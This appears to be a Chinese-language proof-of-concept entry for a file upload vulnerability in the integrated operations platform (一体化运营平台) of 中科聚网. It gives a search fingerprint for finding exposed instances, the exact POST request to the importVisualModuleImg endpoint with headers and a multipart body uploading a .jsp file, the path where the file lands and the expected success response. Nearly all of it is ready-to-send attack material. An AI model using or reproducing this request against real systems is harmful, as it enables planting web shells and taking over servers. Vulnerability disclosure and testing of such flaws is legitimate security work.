# 中科聚网信息技术有限公司一体化运营平台importVisualModuleImg接口存在文件上传漏洞

- **系统**：中科聚网信息技术有限公司一体化运营平台importVisualModuleImg接口　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="一体化运营平台"`
- **请求**：`POST /manage/tplresource/importVisualModuleImg?moduleId=2 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----9979a3f1-cdb1-43af-af88-a9…`　`Content-Length: 198`　`Cookie: JSESSIONID=9438c497-92ad-4800-b821-20602adec4ac; rememberMe=dcOzuzCzFrtr02GhN9Iw…`

**请求体 / payload**
```
------9979a3f1-cdb1-43af-af88-a9b48b67cf71
Content-Disposition: form-data; name="file"; filename="tmp.jsp"
Content-Type: multipart/form-data
6666
------9979a3f1-cdb1-43af-af88-a9b48b67cf71--
上传位置：/files/visual/img/2/tmp.jsp
```
- **预期**：200　|　“msg”:”成功”